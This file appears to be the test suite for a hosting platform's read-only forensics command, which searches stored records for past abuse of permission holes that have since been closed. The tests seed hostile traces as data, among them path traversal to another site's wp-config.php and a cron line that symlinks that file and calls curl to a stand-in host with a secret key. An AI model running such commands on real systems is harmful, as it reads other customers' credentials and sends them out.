<?php

declare(strict_types=1);

use Carbon\CarbonImmutable;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use Onhost\Domain\Identity\Models\User;
use Onhost\Domain\Organizations\Models\Organization;
use Onhost\Domain\Organizations\Models\OrganizationMembership;
use Onhost\Domain\Organizations\OrganizationService;
use Onhost\Domain\Provisioning\Models\Operation;
use Onhost\Domain\Provisioning\Models\ProviderBinding;
use Onhost\Domain\Services\Models\GameServer;
use Onhost\Domain\Services\Models\Service;
use Onhost\Platform\Audit\AuditRecorder;
use Onhost\Platform\Commands\CommandContext;

/*
 * TASK-0038 (permission program P0-01 / IF-0, decision D16) — did anybody use the permission holes before they were
 * closed? `onhost:forensics:lookback` reads what the platform already stored and says, per exploit, which tables it
 * read, which rows match the exploit's trace, and what it could not know. It never writes and never calls a panel.
 *
 * Every trace is SEEDED as the rows the exploit left behind — never produced by running the exploit — because the
 * Phase-0 fixes (TASK-0033 … TASK-0037) close the paths themselves: history must stay readable after they land.
 */

beforeEach(fn () => Http::preventStrayRequests());

/** Runs the command and returns [exit code, decoded JSON report]. */
function flbRun(array $options = []): array
{
    $code = Artisan::call('onhost:forensics:lookback', array_merge(['--json' => true], $options));
    $report = json_decode(Artisan::output(), true);

    return [$code, is_array($report) ? $report : []];
}

/** The one source row of a report. @return array<string,mixed> */
function flbSource(array $report, string $key): array
{
    foreach ((array) ($report['sources'] ?? []) as $source) {
        if (($source['key'] ?? null) === $key) {
            return $source;
        }
    }
    throw new RuntimeException("source {$key} missing from the report");
}

/** An audit row written the way the platform writes it, at a chosen moment. */
function flbAudit(CarbonImmutable $at, CommandContext $context, string $action, array $detail = [], ?string $resourceType = null, ?string $resourceId = null): string
{
    test()->travelTo($at);
    $id = app(AuditRecorder::class)->record($context, $action, 'succeeded', $detail, $resourceType, $resourceId)->id;
    test()->travelBack();

    return $id;
}

function flbUser(string $email, bool $staff = false): User
{
    return User::factory()->create(['email' => $email, 'is_staff' => $staff]);
}

function flbOperation(Service $service, string $kind, array $desired, array $context, CarbonImmutable $at, string $state = Operation::SUCCEEDED, string $actorId = 'usr_flb_actor'): Operation
{
    return Operation::query()->create([
        'organization_id' => $service->organization_id, 'service_id' => $service->id, 'kind' => $kind, 'workflow' => $kind, 'state' => $state,
        'actor_type' => 'user', 'actor_id' => $actorId, 'idempotency_key' => 'flb-'.Str::random(16), 'desired' => $desired, 'context' => $context,
        'provider_instance_id' => $service->provider_instance_id, 'queue' => 'default', 'attempts' => 1,
        'queued_at' => $at, 'started_at' => $at, 'finished_at' => $at->addSeconds(5), 'created_at' => $at, 'updated_at' => $at->addSeconds(5),
    ]);
}

it('finds an owner who accepted an invitation to their own organization at a lower role (TD-1)', function () {
    [$owner, $org] = $this->customerWithOrganization(['email' => 'majitel@firma.test']);
    [$otherOwner, $clean] = $this->customerWithOrganization(['email' => 'jiny@firma.test']);
    $colleague = flbUser('kolega@firma.test');
    $at = CarbonImmutable::parse('2026-09-02 10:00:00');
    // the trace TD-1 left: the owner's own address invited as developer, accepted, the owner binding replaced
    DB::table('organization_invitations')->insert(['id' => $invId = 'inv_flb_owner', 'organization_id' => $org->id, 'email' => 'majitel@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 'a'), 'invited_by' => $owner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);
    OrganizationMembership::query()->where('organization_id', $org->id)->where('user_id', $owner->id)->update(['role_key' => 'developer']);
    flbAudit($at, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $owner->id, 'role' => 'developer'], 'organization', $org->id);
    // an ordinary acceptance in another organization is not a finding
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_clean', 'organization_id' => $clean->id, 'email' => 'kolega@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 'b'), 'invited_by' => $otherOwner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);
    app(OrganizationService::class)->attachMember($clean, $colleague, 'developer', $this->contextFor($otherOwner, $clean), joinedNow: true);
    // an accepted invitation whose address is nobody's any more cannot be judged
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_gone', 'organization_id' => $clean->id, 'email' => 'odesel@firma.test', 'role_key' => 'viewer', 'token_hash' => hash('sha256', 'c'), 'invited_by' => $otherOwner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);

    [$code, $report] = flbRun(['--source' => ['owner_demotion']]);
    $source = flbSource($report, 'owner_demotion');

    expect($code)->toBe(1)
        ->and($source['verdict'])->toBe('HITS')
        ->and($source['exploit'])->toBe('TD-1')
        ->and($source['hits'])->toHaveCount(1)
        ->and($source['hits'][0])->toMatchArray(['kind' => 'owner_accepted_lower_role', 'confidence' => 'confirmed', 'organization_id' => $org->id, 'user_id' => $owner->id, 'invitation_id' => $invId, 'role' => 'developer', 'current_role' => 'developer'])
        ->and($source['hits'][0]['audit_event_id'])->not->toBeNull()
        ->and($source['checked'])->toHaveKeys(['organization_invitations', 'audit_events', 'organization_memberships'])
        ->and(implode(' ', $source['unknowns']))->toContain('1 accepted invitation');
    expect(json_encode($report))->not->toContain('majitel@firma.test'); // ids, never addresses
});

it('finds game services on a panel user that was created for another organization (PA-01)', function () {
    [, $orgA] = $this->customerWithOrganization();
    [, $orgB] = $this->customerWithOrganization();
    [, $orgC] = $this->customerWithOrganization();
    $at = CarbonImmutable::parse('2026-09-03 08:00:00');
    $own = featureGameService($orgA, remoteId: 77);          // panel user 9, created for A
    $foreign = featureGameService($orgB, remoteId: 78);      // B's server placed on A's panel user 9 (the e-mail was reused)
    $unknown = featureGameService($orgC, remoteId: 79);      // C's own user 15 was found by e-mail: its external_id is only on the panel
    ProviderBinding::query()->where('service_id', $unknown->id)->update(['meta' => ['uuid' => 'x', 'identifier' => 'c0ffee01', 'user_id' => 15, 'allocation_id' => 12]]);
    GameServer::query()->create(['service_id' => $unknown->id, 'egg_key' => 'minecraft-paper', 'ptero_user_id' => 15]);
    flbOperation($own, 'provision.game', ['egg' => 'minecraft-paper'], ['ptero_user_id' => 9, 'ptero_user_created' => true], $at);
    flbOperation($foreign, 'provision.game', ['egg' => 'minecraft-paper'], ['ptero_user_id' => 9, 'ptero_user_created' => false], $at->addDay());
    flbOperation($unknown, 'provision.game', ['egg' => 'minecraft-paper'], ['ptero_user_id' => 15, 'ptero_user_created' => false], $at->addDays(2));

    [$code, $report] = flbRun(['--source' => ['game_panel_identity']]);
    $source = flbSource($report, 'game_panel_identity');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(1)
        ->and($source['hits'][0])->toMatchArray(['kind' => 'panel_user_of_other_org', 'confidence' => 'confirmed', 'service_id' => $foreign->id, 'organization_id' => $orgB->id, 'panel_user_id' => 9, 'panel_user_organization_id' => $orgA->id, 'instance' => 'pterodactyl-games01'])
        ->and(implode(' ', $source['unknowns']))->toContain($unknown->id)
        ->and($source['checked'])->toHaveKeys(['services', 'provider_bindings', 'game_servers', 'operations']);
});

it('finds Discord /onhost use after the member was removed, from the link and from the audit (G1)', function () {
    [$owner, $org] = $this->customerWithOrganization();
    $gone = flbUser('odchozi@firma.test');
    $stays = flbUser('zustava@firma.test');
    $t0 = CarbonImmutable::parse('2026-09-04 09:00:00');
    flbAudit($t0, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $gone->id, 'role' => 'developer'], 'organization', $org->id);
    flbAudit($t0, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $stays->id, 'role' => 'developer'], 'organization', $org->id);
    OrganizationMembership::query()->create(['organization_id' => $org->id, 'user_id' => $stays->id, 'role_key' => 'developer', 'state' => 'active', 'joined_at' => $t0, 'created_at' => $t0, 'updated_at' => $t0]);
    $removedAt = $t0->addDays(2);
    flbAudit($removedAt, $this->contextFor($owner, $org), 'organization.member.remove', ['user_id' => $gone->id], 'organization', $org->id);
    DB::table('discord_links')->insert([
        ['id' => 'dl_flb_gone', 'organization_id' => $org->id, 'user_id' => $gone->id, 'discord_user_id' => '4242', 'discord_username' => 'jana', 'state' => 'linked', 'locale' => 'cs', 'linked_at' => $t0->addHour(), 'last_used_at' => $removedAt->addDay(), 'commands' => 7, 'created_at' => $t0, 'updated_at' => $t0],
        ['id' => 'dl_flb_stays', 'organization_id' => $org->id, 'user_id' => $stays->id, 'discord_user_id' => '4343', 'discord_username' => 'petr', 'state' => 'linked', 'locale' => 'cs', 'linked_at' => $t0->addHour(), 'last_used_at' => $removedAt->addDay(), 'commands' => 3, 'created_at' => $t0, 'updated_at' => $t0],
    ]);
    $discord = new CommandContext('user', $gone->id, $org->id, null, null, 'discord-bot', 'discord:4242', 'discord /onhost backup');
    $late = flbAudit($removedAt->addHours(5), $discord, 'integration.discord.command', ['action' => 'backup', 'params' => ['kind'], 'operation_id' => 'op_x'], 'service', 'svc_x');
    flbAudit($t0->addDay(), $discord, 'integration.discord.command', ['action' => 'backup', 'params' => ['kind'], 'operation_id' => 'op_y'], 'service', 'svc_x'); // while still a member

    [$code, $report] = flbRun(['--source' => ['discord_after_removal']]);
    $source = flbSource($report, 'discord_after_removal');
    $kinds = array_column($source['hits'], 'kind');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(2)
        ->and($kinds)->toEqualCanonicalizing(['discord_used_after_removal', 'discord_command_after_removal'])
        ->and(collect($source['hits'])->firstWhere('kind', 'discord_used_after_removal'))->toMatchArray(['link_id' => 'dl_flb_gone', 'organization_id' => $org->id, 'user_id' => $gone->id, 'removed_at' => $removedAt->toIso8601String()])
        ->and(collect($source['hits'])->firstWhere('kind', 'discord_command_after_removal'))->toMatchArray(['audit_event_id' => $late, 'action' => 'backup']);
});

it('finds aaPanel file operations and scheduled commands that reach outside the site root (PA-02)', function () {
    [, $org] = $this->customerWithOrganization();
    $site = featureWebService($org, 'aapanel'); // root /www/wwwroot/shop.cz
    [, $other] = $this->customerWithOrganization();
    $isp = featureWebService($other, 'ispconfig');
    $at = CarbonImmutable::parse('2026-09-05 12:00:00');
    $escape = flbOperation($site, 'service.action', ['action' => 'file.save', 'service_id' => $site->id, 'path' => '../other.cz/wp-config.php', 'content' => 'x'], [], $at);
    $refused = flbOperation($site, 'service.action', ['action' => 'file.rename', 'service_id' => $site->id, 'from' => 'a.txt', 'to' => '/etc/cron.d/x'], [], $at->addMinute(), Operation::FAILED);
    $cron = flbOperation($site, 'service.action', ['action' => 'cron.create', 'service_id' => $site->id, 'schedule' => '* * * * *', 'command' => 'ln -s /www/wwwroot/other.cz/wp-config.php /www/wwwroot/shop.cz/x.txt; curl -s https://example.test/?key=SECRETKEY'], [], $at->addMinutes(2));
    flbOperation($site, 'service.action', ['action' => 'cron.create', 'service_id' => $site->id, 'schedule' => '*/5 * * * *', 'command' => '/www/server/php/83/bin/php /www/wwwroot/shop.cz/cron.php > /dev/null 2>&1'], [], $at->addMinutes(3));
    flbOperation($site, 'service.action', ['action' => 'file.save', 'service_id' => $site->id, 'path' => 'index.php', 'content' => '<?php'], [], $at->addMinutes(4));
    flbOperation($site, 'service.action', ['action' => 'file.extract', 'service_id' => $site->id, 'path' => 'upload/site.zip', 'target' => ''], [], $at->addMinutes(5));
    flbOperation($isp, 'service.action', ['action' => 'file.save', 'service_id' => $isp->id, 'path' => '../x', 'content' => 'x'], [], $at); // not aaPanel: another source

    [$code, $report] = flbRun(['--source' => ['aapanel_outside_root']]);
    $source = flbSource($report, 'aapanel_outside_root');
    $byOperation = collect($source['hits'])->keyBy('operation_id');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(3)
        ->and($byOperation[$escape->id])->toMatchArray(['kind' => 'path_outside_root', 'confidence' => 'confirmed', 'action' => 'file.save', 'service_id' => $site->id, 'state' => 'SUCCEEDED'])
        ->and($byOperation[$refused->id])->toMatchArray(['kind' => 'path_outside_root', 'confidence' => 'attempt', 'state' => 'FAILED'])
        ->and($byOperation[$cron->id])->toMatchArray(['kind' => 'cron_reaches_outside_root', 'confidence' => 'possible'])
        ->and($byOperation[$cron->id]['paths'])->toContain('/www/wwwroot/other.cz/wp-config.php')
        ->and(implode(' ', $source['unknowns']))->toContain('1 archive extraction');
    expect(json_encode($report))->not->toContain('SECRETKEY'); // a cron command is customer content: only the offending paths are shown
});

it('finds audit rows written with an API token of another organization (PA-04)', function () {
    [$user, $orgA] = $this->customerWithOrganization();
    $orgB = app(OrganizationService::class)->create($user, ['name' => 'Druha s.r.o.', 'type' => 'company', 'country' => 'CZ', 'currency' => 'CZK'], CommandContext::system('test'));
    $token = DB::table('personal_access_tokens')->insertGetId(['tokenable_type' => User::class, 'tokenable_id' => $user->id, 'name' => 'ci', 'token' => hash('sha256', 'flb'), 'abilities' => '["*"]', 'organization_id' => $orgA->id, 'created_at' => now(), 'updated_at' => now()]);
    $ctx = fn (Organization $org, string $session) => new CommandContext('user', $user->id, $org->id, null, '10.0.0.1', 'curl', $session);
    $at = CarbonImmutable::parse('2026-09-06 07:00:00');
    $cross = flbAudit($at, $ctx($orgB, "token:{$token}"), 'operation.start', ['kind' => 'service.action'], 'operation', 'op_1');
    flbAudit($at->addMinute(), $ctx($orgB, "token:{$token}"), 'service.update', [], 'service', 'svc_1');
    flbAudit($at->addMinutes(2), $ctx($orgA, "token:{$token}"), 'operation.start', ['kind' => 'service.action'], 'operation', 'op_2'); // its own organization
    flbAudit($at->addMinutes(3), $ctx($orgA, 'token:999999'), 'operation.start', [], 'operation', 'op_3'); // a token that no longer exists

    [$code, $report] = flbRun(['--source' => ['token_cross_org']]);
    $source = flbSource($report, 'token_cross_org');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(1) // one row per token and organization it reached
        ->and($source['hits'][0])->toMatchArray(['kind' => 'token_used_on_other_org', 'confidence' => 'confirmed', 'token_id' => (int) $token, 'token_organization_id' => $orgA->id, 'organization_id' => $orgB->id, 'rows' => 2, 'first_audit_event_id' => $cross])
        ->and($source['hits'][0]['actions'])->toEqualCanonicalizing(['operation.start', 'service.update'])
        ->and(implode(' ', $source['unknowns']))->toContain('1 audit row');
});

it('finds staff force purges and hold lifts on services of an organization the staff user belongs to (SS-1, SS-5)', function () {
    [$owner, $own] = $this->customerWithOrganization();
    [, $foreign] = $this->customerWithOrganization();
    $staff = $this->staff();
    $at = CarbonImmutable::parse('2026-09-07 15:00:00');
    test()->travelTo($at->subDay());
    app(OrganizationService::class)->attachMember($own, $staff, 'developer', $this->contextFor($owner, $own), joinedNow: true);
    test()->travelBack();
    $mine = featureWebService($own, 'ispconfig');
    $theirs = featureWebService($foreign, 'aapanel');
    $lift = flbAudit($at, $this->contextFor($staff, $own), 'service.hold.lift', ['lifted' => ['abuse'], 'reason' => 'omyl'], 'service', $mine->id);
    flbAudit($at, $this->contextFor($staff, $foreign), 'service.hold.lift', ['lifted' => ['payment'], 'reason' => 'zaplaceno'], 'service', $theirs->id); // not their organization
    $purge = flbOperation($mine, 'service.action', ['action' => 'purge', 'service_id' => $mine->id, 'force' => true, 'reason' => 'uklid'], [], $at->addHour(), actorId: $staff->id);
    flbOperation($theirs, 'service.action', ['action' => 'purge', 'service_id' => $theirs->id, 'force' => true, 'reason' => 'abuse'], [], $at->addHour(), actorId: $staff->id);

    [$code, $report] = flbRun(['--source' => ['staff_own_org']]);
    $source = flbSource($report, 'staff_own_org');
    $kinds = collect($source['hits'])->keyBy('kind');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(2)
        ->and($kinds['staff_hold_lift_own_org'])->toMatchArray(['audit_event_id' => $lift, 'user_id' => $staff->id, 'organization_id' => $own->id, 'service_id' => $mine->id])
        ->and($kinds['staff_force_purge_own_org'])->toMatchArray(['operation_id' => $purge->id, 'user_id' => $staff->id, 'organization_id' => $own->id]);
});

it('finds partner payouts above the allocated commissions and payouts to a changed IBAN (P1, P2)', function () {
    [$partnerOwner, $partnerOrg] = $this->customerWithOrganization();
    [, $client] = $this->customerWithOrganization();
    $insider = flbUser('ucetni@partner.test');
    DB::table('partners')->insert(['id' => 'ptn_flb', 'organization_id' => $partnerOrg->id, 'code' => 'FLB1', 'model' => 'share', 'tier' => 'bronze', 'rate_pct' => 15, 'currency' => 'CZK', 'iban' => 'CZ6508000000192000145399', 'state' => 'active', 'created_at' => now(), 'updated_at' => now()]);
    $at = CarbonImmutable::parse('2026-08-01 10:00:00'); // the second payout 20 days later is still in the past
    $payout = function (string $id, string $number, int $amount, string $iban, string $state, CarbonImmutable $when) {
        DB::table('partner_payouts')->insert(['id' => $id, 'partner_id' => 'ptn_flb', 'number' => $number, 'amount_minor' => $amount, 'currency' => 'CZK', 'method' => 'bank_transfer', 'iban' => $iban, 'state' => $state, 'self_billing' => '[]', 'requested_at' => $when, 'paid_at' => $state === 'paid' ? $when->addDay() : null, 'created_at' => $when, 'updated_at' => $when]);
    };
    $commission = function (string $id, int $amount, ?string $payoutId, string $state) use ($client) {
        DB::table('partner_commissions')->insert(['id' => $id, 'partner_id' => 'ptn_flb', 'organization_id' => $client->id, 'period' => '2026-08', 'kind' => 'share', 'base_minor' => $amount * 7, 'rate_pct' => 15, 'amount_minor' => $amount, 'currency' => 'CZK', 'state' => $state, 'payout_id' => $payoutId, 'created_at' => now(), 'updated_at' => now()]);
    };
    $payout('ppo_flb_1', 'PO-2026-08', 100000, 'CZ6508000000192000145399', 'paid', $at);
    $commission('pcm_flb_1', 100000, 'ppo_flb_1', 'paid');
    // the race: two requests passed the balance check together, the second allocated only what was left
    $payout('ppo_flb_2', 'PO-2026-09', 150000, 'CZ5503000000000123456789', 'approved', $at->addDays(20));
    $commission('pcm_flb_2', 50000, 'ppo_flb_2', 'allocated');
    flbAudit($at->addDays(20), $this->contextFor($insider, $partnerOrg), 'partner.payout.request', ['number' => 'PO-2026-09'], 'partner_payout', 'ppo_flb_2');

    [$code, $report] = flbRun(['--source' => ['partner_payouts']]);
    $source = flbSource($report, 'partner_payouts');
    $kinds = collect($source['hits'])->keyBy('kind');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(2)
        ->and($kinds['payout_above_allocated'])->toMatchArray(['payout_id' => 'ppo_flb_2', 'number' => 'PO-2026-09', 'partner_id' => 'ptn_flb', 'amount_minor' => 150000, 'allocated_minor' => 50000, 'excess_minor' => 100000, 'currency' => 'CZK', 'state' => 'approved'])
        ->and($kinds['payout_iban_changed'])->toMatchArray(['payout_id' => 'ppo_flb_2', 'iban' => 'CZ55…6789', 'confirmed_ibans' => ['CZ65…5399'], 'requested_by' => $insider->id, 'requested_by_owner' => false]);
    expect(json_encode($report))->not->toContain('CZ5503000000000123456789')->not->toContain('CZ6508000000192000145399');
});

it('reads only: no write, no panel call, and a clean database says CLEAN or names what it could not see', function () {
    [$owner, $org] = $this->customerWithOrganization();
    featureWebService($org, 'aapanel');
    featureGameService($org);
    $statements = [];
    DB::listen(function ($query) use (&$statements) {
        $statements[] = $query->sql;
    });
    $before = collect(['audit_events', 'operations', 'organization_memberships', 'discord_links', 'outbox_messages', 'provider_calls'])->mapWithKeys(fn ($t) => [$t => DB::table($t)->count()]);
    $statements = [];

    $code = Artisan::call('onhost:forensics:lookback');
    $table = Artisan::output();

    // review round 2: besides SELECTs only the database's own read-only switch (and, on SQLite, switching it back off)
    expect(collect($statements)->reject(fn (string $sql) => preg_match('/^\s*select\b|^SET TRANSACTION READ ONLY$|^PRAGMA query_only = (ON|OFF)$/i', $sql) === 1)->all())->toBe([]);
    expect(collect(['audit_events', 'operations', 'organization_memberships', 'discord_links', 'outbox_messages', 'provider_calls'])->mapWithKeys(fn ($t) => [$t => DB::table($t)->count()]))->toEqual($before);
    Http::assertNothingSent();
    expect($code)->toBe(0)
        ->and($table)->toContain('owner_demotion')->toContain('game_panel_identity')->toContain('discord_after_removal')->toContain('aapanel_outside_root')
        ->toContain('token_cross_org')->toContain('staff_own_org')->toContain('partner_payouts')->toContain('Verdict')
        ->toContain('member_without_invitation')->toContain('project_grant_bypass'); // review round 2: TD-2, TD-3

    [, $report] = flbRun();
    expect($report['read_only'])->toBeTrue()
        ->and(collect($report['sources'])->pluck('verdict')->unique()->diff(['CLEAN', 'UNKNOWNS'])->all())->toBe([])
        ->and($report['summary']['hits'])->toBe(0)
        ->and(flbSource($report, 'game_panel_identity')['verdict'])->toBe('UNKNOWNS') // a panel user nobody recorded creating is not cleared
        ->and(flbSource($report, 'aapanel_outside_root')['verdict'])->toBe('UNKNOWNS') // review round 1: a symlink lives on the node, never CLEAN while aaPanel sites exist
        ->and($report['standing_state'])->toContain('before the first Phase 0 deploy'); // review round 1 (HIGH): the baseline rule travels with every report
});

it('refuses bad options with exit code 2', function () {
    expect(Artisan::call('onhost:forensics:lookback', ['--since' => 'not-a-date']))->toBe(2)
        ->and(Artisan::call('onhost:forensics:lookback', ['--since' => '2026-09-10', '--until' => '2026-09-01']))->toBe(2)
        ->and(Artisan::call('onhost:forensics:lookback', ['--source' => ['nope']]))->toBe(2)
        ->and(Artisan::output())->toContain('owner_demotion');
});

it('limits event rows to the window but keeps the evidence of any age that decides them', function () {
    [$owner, $org] = $this->customerWithOrganization();
    $staff = $this->staff();
    $t = CarbonImmutable::parse('2026-06-01 10:00:00');
    test()->travelTo($t->subDay());
    app(OrganizationService::class)->attachMember($org, $staff, 'developer', $this->contextFor($owner, $org), joinedNow: true);
    test()->travelBack();
    flbAudit($t, $this->contextFor($staff, $org), 'service.hold.lift', ['lifted' => ['abuse'], 'reason' => 'x'], 'service', 'svc_old');

    [, $inside] = flbRun(['--source' => ['staff_own_org'], '--since' => '2026-05-01', '--until' => '2026-07-01']);
    [, $outside] = flbRun(['--source' => ['staff_own_org'], '--since' => '2026-08-01']);

    expect(flbSource($inside, 'staff_own_org')['hits'])->toHaveCount(1) // the membership came before the window and still counts
        ->and(flbSource($outside, 'staff_own_org')['hits'])->toHaveCount(0)
        ->and($outside['window']['since'])->toStartWith('2026-08-01');
});

// ── review round 1 (TASK-0038): the blind spots the reviewers found, each seeded as the trace it would leave ─────────

it('still reports a past owner self-demotion after the ownership was later transferred away (TD-1, review round 1)', function () {
    [$owner, $org] = $this->customerWithOrganization(['email' => 'byvaly@firma.test']);
    $successor = flbUser('nastupce@firma.test');
    $member = flbUser('clen@firma.test');
    $at = CarbonImmutable::parse('2026-09-02 10:00:00');
    // the owner accepts their own invitation as developer; a month later a legitimate transfer hands the organization on
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_past', 'organization_id' => $org->id, 'email' => 'byvaly@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 'p'), 'invited_by' => $owner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at, 'created_at' => $at, 'updated_at' => $at]);
    $selfAttach = flbAudit($at, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $owner->id, 'role' => 'developer'], 'organization', $org->id);
    // the successor was an ordinary member before becoming the owner: that acceptance is not a demotion of anybody
    DB::table('organization_invitations')->insert(['id' => 'inv_flb_successor', 'organization_id' => $org->id, 'email' => 'nastupce@firma.test', 'role_key' => 'developer', 'token_hash' => hash('sha256', 's'), 'invited_by' => $owner->id, 'expires_at' => $at->addDays(7), 'accepted_at' => $at->addDay(), 'created_at' => $at, 'updated_at' => $at]);
    flbAudit($at->addDay(), $this->contextFor($successor, $org), 'organization.member.attach', ['user_id' => $successor->id, 'role' => 'developer'], 'organization', $org->id);
    flbAudit($at->addDays(2), $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $member->id, 'role' => 'viewer'], 'organization', $org->id);
    test()->travelTo($at->addMonth());
    app(OrganizationService::class)->transferOwnership($org, $successor, $this->contextFor($owner, $org)); // attaches the successor as owner and the old owner as org_admin
    test()->travelBack();

    [$code, $report] = flbRun(['--source' => ['owner_demotion']]);
    $source = flbSource($report, 'owner_demotion');

    expect($code)->toBe(1)
        ->and($source['hits'])->toHaveCount(1) // neither the successor's earlier acceptance nor the transfer's own org_admin attach is a hit
        ->and($source['hits'][0])->toMatchArray(['kind' => 'owner_accepted_lower_role', 'organization_id' => $org->id, 'user_id' => $owner->id, 'invitation_id' => 'inv_flb_past', 'audit_event_id' => $selfAttach, 'owner_now' => false]);
});

it('reads Discord questions, action hooks and the gap a re-admission hides (G1, review round 1)', function () {
    [$owner, $org] = $this->customerWithOrganization();
    $gone = flbUser('pryc@firma.test');
    $back = flbUser('zpet@firma.test');
    $stays = flbUser('tady@firma.test');
    $t0 = CarbonImmutable::parse('2026-09-04 09:00:00');
    foreach ([$gone, $back, $stays] as $person) {
        flbAudit($t0, $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $person->id, 'role' => 'developer'], 'organization', $org->id);
    }
    $removedAt = $t0->addDays(2);
    flbAudit($removedAt, $this->contextFor($owner, $org), 'organization.member.remove', ['user_id' => $gone->id], 'organization', $org->id);
    flbAudit($removedAt, $this->contextFor($owner, $org), 'organization.member.remove', ['user_id' => $back->id], 'organization', $org->id);
    flbAudit($removedAt->addDay(), $this->contextFor($owner, $org), 'organization.member.attach', ['user_id' => $back->id, 'role' => 'developer'], 'organization', $org->id); // re-admitted
    foreach ([$back, $stays] as $person) {
        OrganizationMembership::query()->create(['organization_id' => $org->id, 'user_id' => $person->id, 'role_key' => 'developer', 'state' => 'active', 'joined_at' => $t0, 'created_at' => $t0, 'updated_at' => $t0]);
    }
    DB::table('discord_links')->insert([
        // last_used_at is written before any authorization: a use, or a refused attempt
        ['id' => 'dl_flb_pryc', 'organization_id' => $org->id, 'user_id' => $gone->id, 'discord_user_id' => '5151', 'discord_username' => 'eva', 'state' => 'linked', 'locale' => 'cs', 'linked_at' => $t0->addHour(), 'last_used_at' => $removedAt->addHours(6), 'commands' => 4, 'created_at' => $t0, 'updated_at' => $t0],
        // removed and re-admitted while linked: last_used_at keeps only the latest use, after the re-admission
        ['id' => 'dl_flb_zpet', 'organization_id' => $org->id, 'user_id' => $back->id, 'discord_user_id' => '5252', 'discord_username' => 'adam', 'state' => 'linked', 'locale' => 'cs', 'linked_at' => $t0->addHour(), 'last_used_at' => $removedAt->addDays(3), 'commands' => 9, 'created_at' => $t0, 'updated_at' => $t0],
    ]);
    // two `/onhost ask` questions after the removal: one also left its assistant.chat audit row (one hit, not two), one only its run
    $run = fn (string $id, CarbonImmutable $when) => DB::table('support_ai_runs')->insert(['id' => $id, 'organization_id' => $org->id, 'user_id' => $gone->id, 'session_id' => 'discord:5151', 'provider' => 'rules', 'outcome' => 'answered', 'confident' => true, 'created_at' => $when, 'updated_at' => $when]);
    $run('air_flb_audited', $removedAt->addHours(2));
    $run('air_flb_silent', $removedAt->addHours(3));
    $run('air_flb_before', $t0->addDay()); // while still a member
    $discord = new CommandContext('user', $gone->id, $org->id, null, null, 'discord-bot', 'discord:5151', 'discord /onhost ask');
    $chat = flbAudit($removedAt->addHours(2), $discord, 'assistant.chat', ['topic' => 'x', 'outcome' => 'answered', 'provider' => 'rules'], 'ai_run', 'air_flb_audited');
    // an action hook runs as its creator: the removed member's hook ran; a staying member's hook ran after somebody left
    $hookGone = flbAudit($removedAt->addHours(4), new CommandContext('user', $gone->id, $org->id, null, '10.0.0.9', 'action-hook', 'hook:ah_flb_pryc', 'action hook deploy'), 'integration.hook.trigger', ['action' => 'deploy.run', 'operation_id' => 'op_h1'], 'action_hook', 'ah_flb_pryc');
    flbAudit($removedAt->addHours(5), new CommandContext('user', $stays->id, $org->id, null, '10.0.0.9', 'action-hook', 'hook:ah_flb_tady', 'action hook backup'), 'integration.hook.trigger', ['action' => 'backup', 'operation_id' => 'op_h2'], 'action_hook', 'ah_flb_tady');
    DB::table('action_hooks')->insert(['id' => 'ah_flb_pryc', 'organization_id' => $org->id, 'service_id' => 'svc_flb_h', 'created_by' => $gone->id, 'name' => 'deploy', 'action' => 'deploy.run', 'params' => '[]', 'token_hash' => hash('sha256', 'h'), 'enabled' => true, 'created_at' => $t0, 'updated_at' => $t0]);

    [$code, $report] = flbRun(['--source' => ['discord_after_removal']]);
    $source = flbSource($report, 'discord_after_removal');
    $byKind = collect($source['hits'])->groupBy('kind');

    expect($code)->toBe(1)
        ->and($byKind->keys()->all())->toEqualCanonicalizing(['discord_used_after_removal', 'discord_command_after_removal', 'discord_ask_after_removal', 'hook_run_after_removal'])
        ->and($byKind['discord_used_after_removal'])->toHaveCount(1)
        ->and($byKind['discord_used_after_removal'][0])->toMatchArray(['link_id' => 'dl_flb_pryc', 'confidence' => 'use_or_attempt'])
        ->and($byKind['discord_command_after_removal'])->toHaveCount(1)
        ->and($byKind['discord_command_after_removal'][0])->toMatchArray(['audit_event_id' => $chat])
        ->and($byKind['discord_ask_after_removal'])->toHaveCount(1)
        ->and($byKind['discord_ask_after_removal'][0])->toMatchArray(['ai_run_id' => 'air_flb_silent', 'user_id' => $gone->id, 'organization_id' => $org->id])
        ->and($byKind['hook_run_after_removal'][0])->toMatchArray(['audit_event_id' => $hookGone, 'hook_id' => 'ah_flb_pryc', 'user_id' => $gone->id])
        ->and($source['checked'])->toHaveKey('support_ai_runs')
        ->and(implode(' ', $source['unknowns']))->toContain('dl_flb_zpet')->toContain('1 action hook run')
        ->and(implode(' ', $source['notes']))->toContain('ah_flb_pryc');
});

it('reads command.run for paths and symlinks outside the root and never clears aaPanel (PA-02, review round 1)', function () {
    [, $org] = $this->customerWithOrganization();
    $site = featureWebService($org, 'aapanel'); // root /www/wwwroot/shop.cz
    $at = CarbonImmutable::parse('2026-09-05 12:00:00');
